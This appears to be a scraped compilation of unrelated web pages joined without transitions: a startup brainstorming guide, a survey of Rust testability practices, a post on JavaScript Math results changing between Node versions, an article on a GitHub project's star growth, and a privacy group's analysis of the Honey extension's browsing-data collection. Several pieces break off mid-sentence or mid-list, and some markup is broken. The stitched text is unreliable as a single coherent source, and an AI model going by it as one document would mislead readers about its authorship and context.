<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/blue-ocean-strategy.jpg" alt="" width="785" height="368"></p>
<p><span>So using this approach in the ideas matrix described above, you can generate tons of options. But do not forget to validate the ideas before launching them!</span></p>
<p><span>The second simple approach this book suggests taking the existing solution and improve it. Of course, </span><span>you’ll plunge into the world of competition and of a constant race for victory, but if you are really good at what you do and run well in front of your competitors – go ahead!</span></p>
<p>And the last point of this strategy: by challenging the traditional view of who can and should be the target customer, a brand often finds new ways to offer the customer the desired value. For example, consider how Canon copiers created the small desktop copier industry by targeting users rather than corporate buyers.</p>
<p><span>We can continue listing the famous companies that have had&nbsp;a huge success with one simple idea. Moreover, using these matrixes anyone can develop their own idea and fill the empty cells in these tables! In addition, they may help you analyze the profit that certain ideas can bring and the most demanded niches that are starving for tasty ideas.</span><a name="brainstorm"></a></p>
<h2>How to brainstorm startup ideas: techniques and tools</h2>
<p>Brainstorming new business ideas can be done either on your own or in a group. The goal is to create as many ideas as possible, which can be analyzed in detail for their viability and compliance with your life goals.<br>
Here are 6 techniques to help you productively brainstorm new startup ideas.</p>
<p><strong>1. Define your motivation</strong><br>
Let’s say you want to build a hobby-based business. Or organize a lifestyle that depends on your geographic location. Or make your part-time employment full-fledged with a stable large income. Next, answer the question: what business will help you achieve this personal goal? Create a table and in the first column write the goals and the ideas of the business leading to their achievement in the second. Based on this you can build your idea matrix.</p>
<p><strong>2. Imagine you have unlimited time and money</strong><br>
Usually, we discard bold thoughts because we’re mindful of the lack of resources and the present conditions of life. The brain has a natural tendency to quickly judge and discard business ideas and identify them as stupid and untenable. While conducting brainstorming startup ideas, try to fantasize without limits, opening up to meet all the potential ideas as if you have everything in abundance. Think boldly and big: if you could build any business, what would it be?</p>
<p>Write down all the ideas in your startup matrix, no matter how crazy or ghostly they may seem. The secret is that the craziest thoughts can lead to other, more realistic ideas.</p>
<p><strong>3. Spend time in your client’s shoes</strong><br>
It’s a mistake to make a decision about launching a startup based only on the opinion of business owners. It’s important to understand the point of view of potential customers, and only those ideas for startups that take into account the needs and pains of the target audience will find a response. To get a better understanding of your consumer’s world, you can make a survey or conduct deep research, which will help to test your hypotheses. Also, you should trace all the points of consumer’s interaction with your product/service such as marketing, sales, purchases, technical support. By looking at this contact through the eyes of your target audience, you can generate many ideas to improve the customer experience.</p>
<p>It’s important to understand a startup in the context of its use from all sides. A specific using case will give you a simple, linear vision of this process.</p>
<p><strong>4. Building a business idea matrix: describe your target market</strong><br>
Brainstorming around the specifics of targeted markets leads to interesting ideas about the characteristics of the future product. We would advise you to create a cloud of associations that describe the behaviour and traits of your consumer. This will help you to see how you can improve your startup.</p>
<p><strong>5. Quantity is more important than quality</strong><br>
Remember that brainstorming is just a field for generating ideas. This creative thinking process isn’t aimed at evaluating ideas for validity. The task of the moderator is to manage the brainstorming participants to share all their thoughts.</p>
<p><strong>6. No criticism, including constructive and professional</strong><br>
In brainstorming, it is important to be able to “turn off” your background, professional point of view, and fears. These are all limiting factors at this stage. The step-by-step and rigid structure of brainstorming can also limit thinking. Vice versa, bursts of creativity can play into your hands.</p>
<p><em><strong>Use these tools to build your startup idea matrix</strong></em></p>
<p>Don’t ignore the tools that will enhance your creativity. You will need the following things to help you capture your ideas and evaluate them against different criteria:</p>
<ul>
<li><strong>Notebook.</strong> Capture and store all ideas in one place. All developments will be at hand, they’ll be able to stimulate the birth of new ideas in the future. Also, you can return to them after brainstorming.</li>
<li><strong>Colouring markers.</strong> The use of different colours is important both for the aesthetic component of brainstorming and for systematization and differentiation of ideas.</li>
<li><strong>Whiteboard or flipchart.</strong> Especially important in the case of group brainstorming. You want to get enough room so as not to save space in the creative process.</li>
<li><strong>Adhesive stickers.</strong> Their advantage is that they can be moved to other surfaces.<br>
You will get a flexible map of your creative process.</li>
<li><strong>Recorder.</strong> Formulate the thought out loud before writing it down on a notebook or on a whiteboard. Discussing your ideas with your partner helps to concretize the direction of your thinking, stimulates the emergence of derivative ideas.</li>
</ul>
<p>Of course, after brainstorming, the real work begins: auditing the industry, communicating with clients, studying its history, and understanding weak points to validate an idea.</p>

<h2><a name="important"></a>Why is it so important to validate a startup idea?</h2>
<p>So, let’s say you successfully did brainstorming and got some startup ideas at the end. What’s next? Are you ready to throw all your energy and resources into starting a new business?</p>
<p>Wait, there is one more …</p></article></div>

    <p>What can we do when designing Rust code to make it easier to test?
This is a survey of everything I could find<sup id="fnref:survey-method" role="doc-noteref"><a href="#fn:survey-method">1</a></sup> about
testing Rust with a particular focus on design for testability for
correctness.  Some of the articles show multiple things to do on a
worked example, some are more focused on a particular trick.</p>

<p>There doesn’t seem to be a single place that describes all the testing
ideas: it is scattered across book chapters, blog articles, medium
articles, etc. but here are the main sources that I have found.</p>

<ul>
  <li><a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">The Rust book</a> chapter on testing</li>
  <li><a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing command line applications in Rust</a>

<p>I am not going to try to summarize what these sources say: the rest of
this post is a list of some common / interesting topics and which of
these sources describe it in more detail.</p>

<p>Although my main focus is on how to write Rust programs so that they are easy
to test, I touch on the other half of the problem: how to do the testing.</p>

<p><em>[I am new to Rust and my own testing habits are somewhat ad-hoc so this is
definitely not a recommendation of how to write software by me.  I hope it is
useful and that you will tell me what I have missed
<a href="https://twitter.com/alastair_d_reid">on twitter</a> or
<a href="mailto:alastair.d.reid@gmail.com">by email</a>
so that I can update this post.
I would love to hear about any team that has published recommendations for
design-for-testability.]</em></p>

<p>The sources listed above have a bunch of common suggestions that I
explore in more detail below. Many of the sources I found have great
discussions so I will not try to repeat their explanations in this
document but will link to some of the better discussions of each idea
that I found.</p>

<ul>
  <li>Use intermediate data structures to separate deciding what to do
from performing the action: allowing tests to check that the right
decision is being made and avoiding the need to mock/fake the
filesystem, etc.</li>
  <li>Aggressively use newtypes, structs, enums</li>
  <li>Parse and validate inputs early (eg convert strings to enums)</li>
  <li>Also, #[must_use], parse/validate early</li>

<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li>Use Futures with a custom executor to eliminate the
non-determinism of threads</li>
  <li>All randomized testing systems should be fully deterministic
and easily reproducible</li>
  <li>Beware of additional randomness in libraries:
e.g., Rust’s HashMap uses randomized hashing to protect against denial of service attacks.
This makes testing harder.</li>
  <li>Determinism enables minimization of random tests

<p>API design strongly affects testability of that API</p>

  <li>The component should provide a stable contract composed of traits, structs, and enums</li>
  <li>Always implement Clone and fmt::Debug for public types
    <ul>
      <li>types like failure::Error should be converted to something that is cloneable</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a written version of a talk that I gave at <a href="https://wafflejs.com/">WaffleJS</a> in February, which itself was an expansion of a <a href="https://twitter.com/tmcw/status/1187782634623000576">Twitter conversation</a> from October.</em></p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.webp" type="image/webp"><img alt="Math education" src="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.jpg"></picture></p><p>Okay, so it starts with my delayed math education. As part of my Computer Science program, I had access to world-class math professors, access that I mostly wasted. I didn’t like math: the topics were so removed from practice, and I was already frustrated by the highly theoretical, and – I thought at the time and mostly still do – out-of-touch CS program.</p><p>Unfortunately, a few years after graduating, I got the hunger for math. Seeing how I could apply just a little bit of math knowledge to great effect in my work &amp; hobbies had me inspired. But I had no clear way of learning it.</p><p>So I <a href="https://macwright.com/2012/06/26/simple-statistics.html">started Simple Statistics in 2012</a> as a way to learn math, and ever since then, I’ve expanded and maintained the project. It now includes a lot of different algorithms, is one of the most ‘starred’ JavaScript math projects, and presumably is used by people.</p><p>But I started it in 2012. In tech years that’s a really long time ago. Between then and now, there have been 8 LTS releases of <a href="https://nodejs.org/en/">Node</a>. JavaScript and its environments have radically changed. 2012 was before the introduction of React or the first commit to Babel.</p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.webp" type="image/webp"><img alt="Time passing" src="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.jpg"></picture></p><p>So what I noticed over the years was that tests kept breaking when I updated Node. I’d have a test like:</p><div><div><pre><code><span>t</span><span>.</span><span>equal</span><span>(</span><span>ss</span><span>.</span><span>gamma</span><span>(</span><span>11.54</span><span>),</span> <span>13098426.039156161</span><span>);</span>
</code></pre></div></div><p>That would work in Node v10 and break in Node v12. And this is not some complex method: gamma is implemented with arithmetic, Math.pow, Math.sqrt, and Math.sin.</p><h3 id="arithmetic">Arithmetic</h3><p>So I know what you might be thinking: arithmetic. JavaScript, on Twitter, gets a lot of heat for this behavior:</p><div><div><pre><code>0.1 + 0.2 = 0.30000000000000004
</code></pre></div></div><p>As I wrote in <a href="https://macwright.com/2017/07/29/javascript-wats-dissected.html#numbers-are-weird">JavaScript wats, dissected</a>, this is the behavior of every popular programming language, even stodgy pedantic ones like Haskell. Floating point arithmetic might be weird, but it’s very consistent and well-specified: the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> specification is rigorously implemented. So it’s not arithmetic: addition, subtraction, division, and multiplication are pretty set in stone.</p><h3 id="math">Math</h3><p>What it was, was Math. In particular, all of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math">the methods that come after <code>Math.</code></a></p><p>Methods like Math.sin, Math.cos, Math.exp, Math.pow, Math.tan: <a href="https://macwright.com/2013/03/05/math-for-pictures.html">essential ingredients for geometry</a> and basic computation. I started isolating changes in basic function behavior between versions. For example:</p><p>Calculating Math.tanh(0.1)</p><div><div><pre><code>// Node 4
0.09966799462495590234
// Node 6
0.09966799462495581907
</code></pre></div></div><p>Calculating Math.pow(1/3, 3)</p><div><div><pre><code>// Node 10
0.03703703703703703498
// Node 12
0.03703703703703702804
</code></pre></div></div><p>To make matters worse, it’s not just Node’s behavior that’s changing: so are browsers and other places you use JavaScript.</p><p>So this led to the question: <strong>what is math?</strong></p><svg fill="none" viewBox="0 0 1105 572" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1105v572H0z" fill="#fff"></path><path d="M551.933 460.719c92.311 0

coordinates on the rim, and that they’ll draw little squigglies if plotted on X &amp; Y. Actually <em>deriving</em> those methods is what you’ll learn in advanced classes, but the method that you use - the <a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor series</a> - relies on an <em>infinite</em> series, which would be rather laborious for a computer to solve.</p><blockquote><p>“There is no standard algorithm for calculating sine. IEEE 754-2008, the most widely used standard for floating-point computation, does not address calculating trigonometric functions such as sine.”</p></blockquote><p>-<a href="https://en.wikipedia.org/w/index.php?title=Sine&amp;oldid=939445047#Software_implementations">Wikipedia</a></p><p>Computers use a variety of different estimations and algorithms to do math, things like <a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> and various cheating algorithms and lookup tables. This heterogeny explains all of the <a href="https://github.com/search?q=fastmath">‘fastmath’</a> libraries you can find on GitHub: there’s more than one way to implement Math.sin. Famously, Quake III Arena used a <a href="https://en.wikipedia.org/w/index.php?title=Fast_inverse_square_root&amp;oldid=940101226">faster replacement for the inverse square root method</a> in order to speed up rendering.</p><p>So math is implemented as algorithms, and there are multiple common algorithms –&nbsp;and variations of those algorithms –&nbsp;used in practice.</p><p>Instead of telling implementations to pick an algorithm, the JavaScript specification grants them a <em>lot</em> of wiggle room in terms of how they implement these basic functions.</p><blockquote><p>The behaviour of the functions acos, acosh, asin, asinh, atan, atanh, atan2, cbrt, cos, cosh, exp, expm1, hypot, log,log1p, log2, log10, pow, random, sin, sinh, sqrt, tan, and tanh is not precisely specified here except to require specific results for certain argument values that represent boundary cases of interest.</p></blockquote><p>-<a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-function-properties-of-the-math-object">ECMA-262, 10th edition, section 20.2.2 aka “JavaScript”</a></p><p>I don’t know the inner workings of the standards committees, but I imagine they wanted to make sure that just in case Intel or AMD introduce super-fast new math instructions in a new processor, JavaScript wouldn’t have a compatibility crisis.</p><p>Because there are a lot of JavaScript interpreters that are commonly used, because JavaScript is often used via web browsers and there still is some competition between web browsers, and because even popular JavaScript implementations are under pressure to evolve quickly to be the most performant…&nbsp;because of all that, this matters. You actually will encounter, on a regular basis, differences in math.</p><p>This doesn’t matter as much in other interpreted languages, because they tend to have ‘canonical’ interpreters: most of the time you use the Python interpreter of the Python language.</p><h3 id="where-math-happens">Where math happens</h3><p>Next let’s zoom into <em>where</em> these math implementations live. See, in JavaScript, there are three places where basic math can happen:</p><ol><li>The CPU</li><li>The language interpreter (the C++ and C code that underlies JavaScript implementations)</li><li>In software itself, as a library</li></ol><p><strong>1: The CPU</strong></p><p>This was my first guess: I assumed that since CPUs implement arithmetic, they might implement some higher-level math. It turns out that CPUs do have instructions to do trigonometry and other operations, but they’re rarely invoked. The CPU (x86) implementation of sine doesn’t get much love because it’s not reliably faster than an implementation in software (using arithmetic operations on the CPU), nor as accurate.</p><p>Intel also bears some blame for <a href="https://randomascii.wordpress.com/2014/10/09/intel-underestimates-error-bounds-by-1-3-quintillion/">overstating the accuracy of their trigonometric operations</a> by many magnitudes. That kind of mistake is especially tragic because, unlike software, you can’t patch chips.</p><p><strong>2: The language interpreter</strong></p><p>This is how most of the implementations do it, and they implement math in a variety of ways.</p><ul><li>V8 &amp; SpiderMonkey use (slightly different) ports of the <a href="http://www.netlib.org/fdlibm/">fdlibm</a> library for most operations. It has been passed down through the generations, originally written at Sun Microsystems.</li><li>JavaScriptCore (Safari) uses cmath for most operations.</li><li>Internet Explorer used some cmath, but <a href="https://github.com/microsoft/ChakraCore/blob/d86452259dd534718b7eb9ce024ed35aefd33036/lib/Runtime/Library/MathLibrary.cpp#L1028-L1047">also used some assembly instructions and actually <em>did</em> use CPU-provided trig methods</a> when it was compiled for CPUs that had them.</li></ul><p>Historically, all of these implementations have shifted: V8 used to use a homegrown solution for math, and then used <a href="https://github.com/v8/v8/blob/ff7975aa8d1ff6f0904f0f5112d17ea819466983/src/math.js">a port of fdlibm to JavaScript</a>, before finally settling on fdlibm in C.</p><h3 id="why-this-is-an-issue">Why this is an issue</h3><p>Here’s why this is a problem: it chips away at JavaScript’s ability to give consistent results to any problem including mathematics. And that especially hits <em>data science</em>. I want JavaScript to be a contender for data science in the browser, and – amongst some other issues, like number types and a confounding lack of a commonly-used data-frames library –&nbsp;an inability to produce replicable results means adding more crisis to the <a href="https://en.wikipedia.org/wiki/Replication_crisis">replication crisis</a> in the sciences.</p><h3 id="the-third-way">The third way</h3><p>There is a way out that we can use today. <a href="https://github.com/stdlib-js/stdlib">stdlib</a> is a JavaScript library that reimplements higher-level math using arithmetic alone. Arithmetic is fully-specified and standard, so the results that stdlib gives you are also fully consistent, across all the platforms.</p><p>This comes at the cost of complexity and speed: stdlib isn’t consistently as fast as built-in methods, and you’ll need to require a library ‘just’ to compute sine.</p><p>But in the wider view, this is pretty normal! WebAssembly, for example, doesn’t give you higher-level math methods at all and recommends you include a math implementation in your modules themselves:</p><blockquote><p>“WebAssembly doesn’t include its own math functions like sin, cos, exp, pow, and so on. WebAssembly’s strategy for such functions is to allow them to be implemented as library routines in WebAssembly itself (note that x86’s sin and cos instructions are slow and imprecise and are generally avoided these days anyway).”</p></blockquote><p>And this is the way that compiled languages have always worked: when you compile a C program, the methods you import from <code>math.h</code> are included in the compiled binary.</p><h3 id="using-an-epsilon">Using an epsilon</h3><p>If you don’t want to include stdlib to do math but you do want to test math-heavy code, you’ll probably have to do what simple-statistics does right now: use an epsilon. Of the <a href="https://en.wikipedia.org/w/index.php?title=Epsilon&amp;oldid=938802001#Symbol">5+ uses of epsilon in math</a>, the one I’m referring to is “an arbitrarily small positive quantity”. It’s a tiny number. Here’s <a href="https://github.com/simple-statistics/simple-statistics/blob/727eaed049af4f788fb2299e5c8263573618e78c/src/epsilon.js#L35">simple-statistics’s implementation</a>: the number 0.0001.</p><p>You then compare <code>Math.abs(result - expected) &lt; epsilon</code> to make sure you got within range of the desired value, with a little bit of wiggle room.</p><h3 id="the-moral-of-the-story">The moral of the story</h3><p>Here’s where I was a little short on time in person and have some room to expand.</p><p><em>First, what’s under the hood is rarely what you expect.</em> Our current tech stack is heavily optimized and a lot of optimizations are really just dirty tricks. For example, the number of hardware instructions it takes to solve <code>Math.sin</code> varies based on the input, because there are lots of special cases. When you get to more complex cases, like ‘sorting an array’, there are often multiple algorithms that the interpreter chooses between in order to give you your final result. Basically, the cost of anything you do in an interpreted language is variable.</p><p><em>Second, don’t trust the system too much.</em> What I was seeing between Node versions really <em>should</em> have been a bug in the testing library, or something in my code, or maybe in simple-statistics itself. But in this case, digging deeper revealed that what I was seeing was exactly what you don’t expect: a glitch in the language itself.</p></div></div>

<p>In this article, you will discover how my open-source JavaScript project got 800 stars on GitHub within two days of publishing it. My project is called KOAN (github.com/soygul/koan), and I created it to preserve my general knowledge in Koa and Angular frameworks, as well as Node.js and MongoDB, by making a ready-to-use project template. Upon submitting it to a couple of JavaScript newsletters for review, it exploded and got 800 stars in its first two days of existence! So how did this happen? Did I get lucky? Or did I build something special that people wanted or needed? Or did I simply game the GitHub? Well, read on.</p>

</ul>

<h2 id="koan-project">KOAN Project</h2>
<p>First things first. My project, KOAN, is a full-stack web framework template which you can use as a starting point for your JavaScript web apps. On the backend, it uses Koa framework plus Node.js and MongoDB. On the frontend, it uses Angular and WebSockets for real-time interactions between logged-in users.</p>

<p><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_heroku_demo.png" alt="KOAN Heroku Demo"></p>

<p>A web app boilerplate with built-in WebSocket support is what got the attention of JavaScript newsletters in the first place. Also, few open-source projects offer a complete working sample of their projects, so creating a Facebook clone with KOAN was a great demonstration of its capabilities.</p>

<p><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_on_newsletters.png" alt="KOAN on Newsletters"></p>

<h2 id="koan-demonstration">KOAN Demonstration</h2>
<p>Now let me demonstrate the project to you, and then we can investigate why it was successful. Let’s start with the KOAN’s GitHub project page. It is an open-source project with the MIT license. It is a 7-year-old project, and I didn’t update it much in the last five years, so it has been losing stars since then, almost back to day 2!</p>

<p><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_github.png" alt="KOAN GitHub README"></p>

<p>If we check out the README file, you can see that it is very clean and well structured. It starts with introducing the technology stack, continues with the live example and getting started instructions. Getting started is easy, you clone the repo, do <code>npm install &amp;&amp; npm start</code>, and you have a basic working Facebook clone on your computer.</p>

<p><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_github_README.png" alt="KOAN GitHub README"></p>

<p>You can see that I even have a “Deploy to Heroku” button for one-click sample deployments of this project for people who want a quick start. Finally, the readme provides the rest of the configuration, testing, and licensing information. If you check out the source code, you can see that it is equally well documented. As a wise man once said, <a href="https://blog.codinghorror.com/code-tells-you-how-comments-tell-you-why/" target="_blank">code comments should tell you the why, and the code itself should tell you how</a>.</p>

<p><strong>Note: Following section is the excerpt from the video demonstration. You can find the link to it in the resources section above.</strong></p>

<p>Now let’s go ahead and check the live sample. You can see that I created a Facebook clone as an example usage of KOAN template. Yet again, the very first page of the demo website starts by introducing the project: “KOAN (Koa, Angular, Node): Full-stack JavaScript Web development boilerplate.”. It also introduces the technology stack:</p>

<ul>
  <li>Koa framework provides the RESTful backend API, utilizing async functions.</li>
  <li>Angular is our fully static client-side app framework, and it is heroic!</li>
  <li>Node.js is the superglue, runtime for the backend, build system for the front.</li>
  <li>Finally, MongoDB is our NoSQL database of choice in this stack and sample app.</li>
</ul>

<p><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_heroku_demo_login.png" alt="KOAN Heroku Demo Login"></p>

<p>Let’s log in and see how it goes. Default credentials are pre-filled, so I will just use them. Logins with other social accounts is a feature that I implemented as a bonus. After login, you can see that it is a clone of Facebook in its early days. You can type comments or create new posts. You can also check your profile page, notifications, and messages. Remember when I said that the project was using WebSockets. The green dot near your name indicates that you are connected to the Node.js backend using a WebSocket connection. Let me open another window and log in as another user. When I submit a comment on one tab, it appears on the other in real-time, thanks to the persistent WebSocket connection to the backend. I won’t go into the details, but this very basic feature alone made this project very valuable to many starters who are looking to implement a real-time web app with WebSockets.</p>

<p>By the way, if you are interested, I have an entire article demonstrating my open-source project workflow using Git, GitHub, and Docker. You can find the link to it in the resources section.</p>

<h2 id="how-to-get-starts-on-github-then">How to Get Starts on GitHub Then?</h2>
<p>Now you have seen a successful project with a successful execution, which resulted in a ton of recognition (and stars, forks etc.) on GitHub. So how did this all get together? Let me summarize it:</p>

<ul>
  <li>Create something useful. There is a very fine line between working on something genuinely useful versus an unrealistic and unattainable goal. Use your best intuition to create something that will help people, do your market research, look for things that you need in your daily life. Don’t just depend on wishful thinking.</li>
  <li>Build your project on top of best frameworks and tools. I built KOAN using Koa Framework, Angular, Node.js, and MongoDB. The reason why I built KOAN on top of these tools was that they were the best tools for the business at the time. On top of that, they were trending tools with strong userbase growth, so I was sure of their future success (and I was right!). The success of the tools that I used also contributed to the success of KOAN.</li>
  <li>Present your project as best as possible. As you have just seen, KOAN has a great live demonstration. The live example being a Facebook clone helps you compare it to Facebook directly, and demonstrates what you can do with it. The project also has very clean and concise documentation, along with fully commented source code.</li>
  <li>Introduce your project with a well-organized README file at your project’s home. A good README on GitHub is generally in the following format:
    <ul>
      <li>Introduce the project.</li>
      <li>Introduce the technology.</li>
      <li>Link to live example(s) and screenshots.</li>
      <li>Quickstart guide.</li>
      <li>Configuration/parameters section.</li>
      <li>Testing section.</li>
      <li>Credits/licensing.</li>
    </ul>
  </li>
  <li>Pour your previous experiences into the project. The reason as to why KOAN is so clean both in presentation and code is that I have created many web apps using similar tools. I finally decided to assemble a single master template project for my future work with all the experiences that I had up to that moment. Hence, I created KOAN.</li>
  <li>Eat your own dog food. I’ve used KOAN in many projects, including in my current startup. Every time I used KOAN for a new project, I’ve improved a part of it and backported patches from the new project back into KOAN. Keep improving your project, especially if you want to reuse it in your future work.</li>
  <li>Be attentive to bug reports and feature requests. I’ve resolved most issues reported on GitHub in less than a day. I’ve also reviewed most pull-requests pretty much instantly, created a backlog of features that can be implemented in the future, and closed the unrealistic feature requests. A clean backlog clearly demonstrates to onlookers that the project is well maintained and is dependable.</li>
  <li><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_github_issues.png" alt="KOAN GitHub Issues"></li>
  <li>Being the best option on the market helps. This one is subjective, but when I created KOAN, there was no other high-quality and complete project template like it. None of the alternatives come with a full-on demonstration, and instant-deploy options like KOAN did. Nor did any other project’s documentation compared to the clean and concise documentation of KOAN.</li>
  <li>Being the first to market helps. KOAN was one of the first web app project templates to come with built-in WebSocket support. This is also what got JavaScript newsletters interested in the first place.</li>
  <li>Finally, submit your creation for reviews. Contact newsletters, ping people on Twitter, submit it to relevant sub-Reddits. However, don’t be pushy. Let the people decide for themselves.</li>
  <li><img src="https://quanticdev.com/articles/my-project-got-800-stars-in-two-days-on-github/media/koan_hackernews_2014.png" alt="KOAN Hacker News 2014"></li>
  <li>You might eventually try and turn your project into a commercial success. Open-source or not, you always have great options for financing from government institutions to crowdfunding. If you want to learn about all kinds of financing options to help you with bringing your dream to life, check out my dedicated article on how to find funding for your projects. As usual, the link to it is in the resources section above.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>
<p>Don’t forget that the primary objective of open-sourcing software is to be useful to the open-source community. The recognition (stars etc.) that comes with it is just a bonus. When the community starts using your software, they will begin to contribute back, which will benefit you in return, and everybody else. Take being useful as your goal, and you will get recognition eventually. Just like this article! If you found this article useful, share it with someone who you think might also find it useful. I will showcase more of my successful software projects in the future. If you want to see them, follow me on my socials. If you have a project that you want me to check out, let me know. I will review them and maybe even feature them …</p></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><strong>The free browser extension “Honey” wants to save their users money by automatically finding and applying coupon codes. They describe themselves as advocates for data protection and allegedly only collect history data on online shopping websites. Two of our members who have used Honey in the past, have asked for access to the data saved on them using the GDPR. Our analysis of the responses shows that Honey collects history data on a large scale, contrary to what their own privacy policy says. Thus, we have submitted complaints with the data protection authorities.</strong></p><p>“Stop wasting money – Honey helps you find some of the best coupon codes on 30,000+ sites.” That’s how Honey describe themselves on their homepage. The free browser extension is heavily advertised on YouTube and other websites. The idea behind it is nothing new. There have been websites that collect coupon codes for various online shops for a long time.</p><p>But Honey goes one step further and wants to make this process easier for their users. Sometimes, the coupon codes found on such websites are expired or only work for certain items. Trying the different coupons codes, that are often spread across many websites, can genuinely be quite frustrating. Honey promises to do that work for their users. Once installed in the browser, the addon automatically enters all coupons it knows on the shopping cart pages of supported websites. Afterwards, it applies the one that yields the biggest savings.</p><p>Honey then earn money through so-called “affiliate marketing”. The participating shops pay a commission to Honey for the coupons used.</p><p>So far, so good. But as a non-profit promoting data protection, we are mostly interested in one thing: How does Honey process their users’ data? As a browser extension, Honey could in theory record all internet traffic and thus log the entire browser history. This is especially problematic as Honey is run by a US company, <a href="https://www.datarequests.org/company/joinhoney/">Honey Science LLC</a>, that was recently <a href="https://help.joinhoney.com/article/302-what-does-honey-joining-paypal-mean-for-members">bought by PayPal</a>.</p><p>To find out what data Honey collects, we could first take a look at their privacy policy (and, of course, <a href="#honey-privacy-policy">we did</a>). But these unfortunately tend to be pretty general. They don’t really give users an idea on what data is actually collected on them. Luckily, the GDPR can help here. It grants users <a href="https://www.datarequests.org/blog/your-gdpr-rights/">extensive rights with regards to their data</a>. One of those is the so-called <em>right to data access</em>, which is defined in Art. 15 GDPR, and allows all consumers to demand a copy of the data companies have saved on them. This makes it possible to verify a company’s statements.</p><p>Two of our members, Benni and Malte, have made use of this right. They had both used the Honey extension in the past for a while. Benni had created an account and used that to log into the extension, while Malte has used the extension without an account. Both used our <a href="https://www.datarequests.org/generator/">generator</a> to send an access request to Honey.</p><p>We have then analysed the responses they received.</p><p>When logged into the extension with an account, accessing the data was very easy. The response containing the data arrived within a little more than two weeks. It contained various CSV files on different topics. The first couple contained details that one would expect: the data from the user profile, country and language, the <em>Honey Gold</em> balance, a list of transactions qualifying for Honey Gold, the IP addresses and browsers used at the time of registering for an account and installing the extension.</p><p>However, it also contained a file called <code>PageViews.csv</code> that was a lot more surprising. As the name implies, this file contains a list of page views. For Benni, who used the extension from mid February 2020 to mid May 2020, it contained a staggering 2591 entries.</p><p>To give an example, one of the lines in the file looks like this (displayed as a column here for better readability):</p><p>We can see: <strong>For every visit of a page in an online shop, Honey logs at least the following information</strong>: a timestamp, multiple <strong>unique IDs</strong> for user, session and device, the operation system, the browser and browser version, geolocation details, and the <strong>full URL of the visited page</strong>.<br>From that, the company gains an incredibly detailed insight into the shopping behaviour of its users. It knows not only the products that users buy but also all the products that they looked at but ultimately didn’t end up buying, as well as how long they looked at the product page.</p><p>We consider even this processing to be excessive. But it may be possible to barely justify it given that Honey’s purpose is to find coupon codes for the products that users look at. But Honey collects <em>a lot</em> more data.</p><p>Indeed, not only product pages from online shops are logged. Instead, Honey saves any visit to a page whose domain the company has classified as an “online shopping website”. But many shopping websites don’t just include the actual product pages. They often have a multitude of other content, like blog posts or login pages.<br>And Honey goes even further yet: They log page views even for subsites that are on different subdomains. Thus, the user’s browsing habits on countless forums, support pages and other sites are also documented. And for all of these pages, the full URL is saved, even including the document fragment that may allow reconstructing the precise position of the page the user looked at. The logged URLs and included parameters can also contain sensitive data but in any case they allow Honey to get a detailed view into the users’ browsing habits.</p><p>To demonstrate the scope of the profiles that Honey could create from this data, we have selected a few rows from Benni’s data export and will now describe what information could be inferred from this. The exact raw data of the corresponding rows is published below.</p><p>Honey knows, that on February 13, 2020 at 2:57 PM, Benni looked at an <a href="https://www.ifixit.com/Guide/Nintendo+Wii+DVD+Drive+Lens+Replacement/4491">iFixit guide</a> on how to swap the DVD lens on a Wii. He viewed the details for his AliExpress order <code>3002876007952992</code> a total of 13 times, starting on February 17 at 7:43 PM. He started a dispute for this order on February 25 at 10:01 AM. But before that, he went looking for an Airbnb in Berlin-Mitte on February 24 at 8:02 PM. He was looking for an entire accommodation or a hotel room for two adults for the period from March 04 to March 05. On March 01 at 6:46 PM, he looked at an <a href="https://support.apple.com/en-us/HT204306">Apple support page</a> describing how to reset an iPhone if you forgot the unlock code. The next day at 2:25 PM, he was interested in the <a href="https://creativecommons.org/licenses/by/4.0/">CC-by license</a> by Creative Commons and on March 10 at 9:04 PM, he looked at the <a href="https://developer.microsoft.com/en-us/fabric">Fabric UI Framework</a> by Microsoft. He is apparently also a member of a Microsoft family, as he added another member to his family the next day at 7:45 PM to share the benefits of his Office 365 subscription with them. On March 14 at 11:49 AM, he read an <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2018-1000136-electron-nodeintegration-bypass/">article</a> on a security vulnerability in the Electron framework. On March 23 at 5 PM, he watched the documentary <a href="https://curiositystream.com/video/1984/scanning-the-pyramids">“Scanning The Pyramids”</a> via the streaming provider CuriosityStream. He signed up for the service only half an hour earlier, at 4:29 PM, having been recruited by YouTuber Tom Scott and registering via his affiliate link. On March 25 at 6:51 PM, he was again interested in a trip, this time via FlixBus. He planned the trip as a one-way trip between Berlin and Leipzig for an adult on May 01. But this trip never took place, as there are no further entries for FlixBus. On April 22 at 8:33 AM, Benni redeemed a game on Steam with the code <code>5HGP6-JVK5C-I92YW</code>. On May 11 at 9:04 PM, he then informed himself about the lack of support for exporting in the MKV format in Adobe Premiere on the <a href="https://community.adobe.com/t5/premiere-pro/premiere-pro-cc-doesn-t-support-mkv-anymore/td-p/10586989?page=1">Adobe support forum</a>. He has an AWS account and access to the S3 bucket named <code>dacdn-static</code>. This contains a file with the path 